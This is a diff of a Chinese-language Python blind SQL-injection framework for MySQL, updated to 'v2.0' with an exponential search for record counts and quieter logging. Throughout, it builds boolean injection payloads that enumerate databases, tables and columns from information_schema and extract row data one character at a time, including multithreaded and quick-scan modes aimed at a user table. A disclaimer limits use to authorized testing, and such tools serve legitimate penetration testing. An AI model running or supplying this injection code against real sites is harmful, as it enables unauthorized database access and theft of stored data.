@@ -1,12 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-MySQL SQL注入测试工具
+MySQL SQL注入测试工具 v2.0
+优化版本：使用指数增长方式判断记录数量，减少日志输出
 用于安全测试和渗透测试，请仅在授权的环境中使用
 
 核心设计：
 - req函数完全由用户自定义，包括URL、请求方式、参数、代理、判断逻辑等
 - 工具只提供框架，不预设任何配置
 - 用户需要根据具体目标环境编写自己的req函数
+- 使用指数增长方式从低到高判断记录数量，提高效率
 """
 
 import sys
@@ -82,7 +84,7 @@ class Statistics:
             return "没有操作记录"
         
         report = []
-        report.append("# MySQL SQL注入测试报告")
+        report.append("# MySQL SQL注入测试报告 v2.0")
         report.append(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         report.append("")
         
@@ -144,7 +146,7 @@ class Statistics:
     def print_final_report(self):
         """打印最终报告"""
         print("\n" + "="*60)
-        print("MySQL SQL注入测试完成")
+        print("MySQL SQL注入测试完成 v2.0")
         print("="*60)
         
         # 打印总体统计
@@ -191,15 +193,6 @@ def req(payload):
         1: 注入成功（根据用户自定义逻辑判断）
         2: 注入失败（根据用户自定义逻辑判断）
         3: 网络错误
-    
-    用户需要自定义的内容：
-    1. 目标URL
-    2. 请求方式（GET/POST等）
-    3. 请求参数和注入点
-    4. 代理设置
-    5. 请求头
-    6. 判断注入成功的逻辑
-    7. 错误处理
     """
     
     # 增加请求计数
@@ -241,11 +234,27 @@ def req(payload):
 
 # ==================== 优化后的核心算法 ====================
 
-def binary_search_count(sql_template: str) -> int:
+def exponential_search_count(sql_template: str) -> int:
     """
-    使用二分搜索计算记录数量 - 优化版本
+    使用指数增长方式计算记录数量 - 优化版本
+    从1开始，按指数增长方式快速定位记录数量范围
     """
-    left, right = 0, 10000
+    # 从1开始，按指数增长方式搜索
+    current = 1
+    while True:
+        payload = sql_template.format(current)
+        status = req(payload)
+        
+        if status == 1:  # 成功，继续增加
+            current *= 2
+            if current > 1000000:  # 防止无限增长
+                break
+        else:  # 失败，找到上界
+            break
+    
+    # 在找到的范围内使用二分搜索精确定位
+    left = current // 2
+    right = current
     
     while left < right:
         mid = (left + right) // 2
@@ -293,16 +302,15 @@ def binary_search_string(sql_template: str, length: int) -> str:
 def get_dbs() -> List[str]:
     """获取所有数据库名称"""
     stats.start()
-    print("开始获取数据库列表...")
+    print("获取数据库列表...")
     
     count_sql = "(select count(*) from information_schema.SCHEMATA) > {}"
-    db_count = binary_search_count(count_sql)
+    db_count = exponential_search_count(count_sql)
     
     databases = []
     for i in range(db_count):
         db_name = get_db_name(i)
         databases.append(db_name)
-        print(f"发现数据库: {db_name}")
     
     stats.stop()
     stats.add_operation("数据库枚举", databases)
@@ -311,16 +319,15 @@ def get_dbs() -> List[str]:
 def get_tables(db_name: str) -> List[str]:
     """获取指定数据库的所有表名"""
     stats.start()
-    print(f"开始获取数据库 '{db_name}' 的表列表...")
+    print(f"获取数据库 '{db_name}' 的表列表...")
     
     count_sql = f"(select count(*) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}') > {{}}"
-    table_count = binary_search_count(count_sql)
+    table_count = exponential_search_count(count_sql)
     
     tables = []
     for i in range(table_count):
         table_name = get_table_name(db_name, i)
         tables.append(table_name)
-        print(f"发现表: {table_name}")
     
     stats.stop()
     stats.add_operation(f"表枚举 ({db_name})", tables)
@@ -329,16 +336,15 @@ def get_tables(db_name: str) -> List[str]:
 def get_columns(db_name: str, table_name: str) -> List[str]:
     """获取指定表的所有列名"""
     stats.start()
-    print(f"开始获取表 '{db_name}.{table_name}' 的列列表...")
+    print(f"获取表 '{db_name}.{table_name}' 的列列表...")
     
     count_sql = f"(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}') > {{}}"
-    column_count = binary_search_count(count_sql)
+    column_count = exponential_search_count(count_sql)
     
     columns = []
     for i in range(column_count):
         column_name = get_column_name(db_name, table_name, i)
         columns.append(column_name)
-        print(f"发现列: {column_name}")
     
     stats.stop()
     stats.add_operation(f"列枚举 ({db_name}.{table_name})", columns)
@@ -348,10 +354,9 @@ def get_data(db_name: str, table_name: str, column_name: str,
              where_clause: str = "1=1", row_index: int = 0) -> str:
     """获取指定列的数据"""
     stats.start()
-    print(f"开始获取数据: {db_name}.{table_name}.{column_name} (第{row_index+1}行)...")
     
     length_sql = f"(select length({column_name}) from {db_name}.{table_name} where {where_clause} limit {row_index},1) > {{}}"
-    data_length = binary_search_count(length_sql)
+    data_length = exponential_search_count(length_sql)
     
     data_sql = f"(select ord(substring({column_name}, {{}}, 1)) from {db_name}.{table_name} where {where_clause} limit {row_index},1) > {{}}"
     result = binary_search_string(data_sql, data_length)
@@ -364,17 +369,15 @@ def get_all_data(db_name: str, table_name: str,
                  where_clause: str = "1=1", max_rows: int = 10, columns: List[str] = None) -> List[dict]:
     """获取表的所有数据"""
     stats.start()
-    print(f"开始获取表 '{db_name}.{table_name}' 的所有数据...")
+    print(f"获取表 '{db_name}.{table_name}' 的数据...")
     
     # 获取列名（如果未提供）
     if columns is None:
         columns = get_columns(db_name, table_name)
-    else:
-        print(f"使用已获取的列名: {columns}")
     
     # 获取行数
     count_sql = f"(select count(*) from {db_name}.{table_name} where {where_clause}) > {{}}"
-    row_count = min(binary_search_count(count_sql), max_rows)
+    row_count = min(exponential_search_count(count_sql), max_rows)
     
     all_data = []
     for row_index in range(row_count):
@@ -383,7 +386,6 @@ def get_all_data(db_name: str, table_name: str,
             value = get_data(db_name, table_name, column, where_clause, row_index)
             row_data[column] = value
         all_data.append(row_data)
-        print(f"获取第 {row_index + 1} 行数据完成")
     
     stats.stop()
     stats.add_operation(f"全表数据提取 ({db_name}.{table_name})", all_data)
@@ -394,7 +396,7 @@ def get_all_data(db_name: str, table_name: str,
 def get_db_name(index: int) -> str:
     """获取数据库名称"""
     length_sql = f"(select length(SCHEMA_NAME) from information_schema.SCHEMATA limit {index},1) > {{}}"
-    name_length = binary_search_count(length_sql)
+    name_length = exponential_search_count(length_sql)
     
     name_sql = f"(select ord(substring(SCHEMA_NAME, {{}}, 1)) from information_schema.SCHEMATA limit {index},1) > {{}}"
     return binary_search_string(name_sql, name_length)
@@ -402,7 +404,7 @@ def get_db_name(index: int) -> str:
 def get_table_name(db_name: str, index: int) -> str:
     """获取表名称"""
     length_sql = f"(select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}' limit {index},1) > {{}}"
-    name_length = binary_search_count(length_sql)
+    name_length = exponential_search_count(length_sql)
     
     name_sql = f"(select ord(substring(TABLE_NAME, {{}}, 1)) from information_schema.TABLES where TABLE_SCHEMA = '{db_name}' limit {index},1) > {{}}"
     return binary_search_string(name_sql, name_length)
@@ -410,7 +412,7 @@ def get_table_name(db_name: str, index: int) -> str:
 def get_column_name(db_name: str, table_name: str, index: int) -> str:
     """获取列名称"""
     length_sql = f"(select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}' limit {index},1) > {{}}"
-    name_length = binary_search_count(length_sql)
+    name_length = exponential_search_count(length_sql)
     
     name_sql = f"(select ord(substring(COLUMN_NAME, {{}}, 1)) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}' limit {index},1) > {{}}"
     return binary_search_string(name_sql, name_length)
@@ -431,10 +433,10 @@ class ThreadWorker(threading.Thread):
 def parallel_get_columns(db_name: str, table_name: str) -> List[str]:
     """多线程获取列名"""
     stats.start()
-    print(f"开始多线程获取表 '{db_name}.{table_name}' 的列列表...")
+    print(f"多线程获取表 '{db_name}.{table_name}' 的列列表...")
     
     count_sql = f"(select count(*) from information_schema.COLUMNS where TABLE_SCHEMA = '{db_name}' and TABLE_NAME = '{table_name}') > {{}}"
-    column_count = binary_search_count(count_sql)
+    column_count = exponential_search_count(count_sql)
     
     threads = []
     for i in range(column_count):
@@ -455,13 +457,11 @@ def parallel_get_data(db_name: str, table_name: str,
                      where_clause: str = "1=1", row_index: int = 0, columns: List[str] = None) -> dict:
     """多线程获取行数据"""
     stats.start()
-    print(f"开始多线程获取表 '{db_name}.{table_name}' 第{row_index+1}行数据...")
+    print(f"多线程获取表 '{db_name}.{table_name}' 第{row_index+1}行数据...")
     
     # 获取列名（如果未提供）
     if columns is None:
         columns = parallel_get_columns(db_name, table_name)
-    else:
-        print(f"使用已获取的列名: {columns}")
     
     threads = []
     for column in columns:
@@ -483,15 +483,13 @@ def parallel_get_data(db_name: str, table_name: str,
 def quick_scan(db_name: str, table_name: str, max_rows: int = 3):
     """快速扫描表数据"""
     stats.start()
-    print(f"开始快速扫描: {db_name}.{table_name}")
+    print(f"快速扫描: {db_name}.{table_name}")
     
     # 获取列名
     columns = get_columns(db_name, table_name)
-    print(f"列: {columns}")
     
     # 获取数据 - 使用已获取的列名，避免重复获取
     all_data = get_all_data(db_name, table_name, "1=1", max_rows, columns)
-    print(f"数据: {all_data}")
     
     stats.stop()
     stats.add_operation(f"快速扫描 ({db_name}.{table_name})", all_data)
@@ -500,7 +498,7 @@ def quick_scan(db_name: str, table_name: str, max_rows: int = 3):
 def get_database_info() -> dict:
     """获取数据库信息摘要"""
     stats.start()
-    print("开始获取数据库信息摘要...")
+    print("获取数据库信息摘要...")
     
     databases = get_dbs()
     info = {}
@@ -542,20 +540,19 @@ def save_final_report(filename: str = "result.txt"):
 # ==================== 主程序 ====================
 
 if __name__ == "__main__":
-    print("MySQL SQL注入测试工具 - 优化版本")
+    print("MySQL SQL注入测试工具 v2.0 - 指数增长优化版本")
     print("=" * 50)
     print("重要提示：")
     print("1. 请先修改req函数中的目标URL、请求参数、代理设置等")
     print("2. 根据目标系统响应特征自定义判断逻辑")
     print("3. 确保有合法的测试权限")
-    print("4. 工具会自动统计每次操作的请求数量和耗时")
+    print("4. 使用指数增长方式判断记录数量，提高效率")
     print("5. 完成后会生成详细报告并保存到result.txt")
     print("=" * 50)
     
     try:
         # 示例用法
         # databases = get_dbs()  # 获取所有数据库
-        # print(databases)
         # tables = get_tables("testdb")  # 获取指定数据库的表
         # columns = get_columns("testdb", "user")  # 获取指定表的列
         data = quick_scan("testdb", "user")  # 快速扫描表数据
@@ -573,5 +570,4 @@ if __name__ == "__main__":
             stats.print_final_report()
             save_final_report()
     
-    print("工具已优化完成，请根据实际需求修改req函数后使用")
-    print("每次操作都会显示详细的统计信息，包括请求数量和耗时")
+    print("工具已优化完成，请根据实际需求修改req函数后使用") 
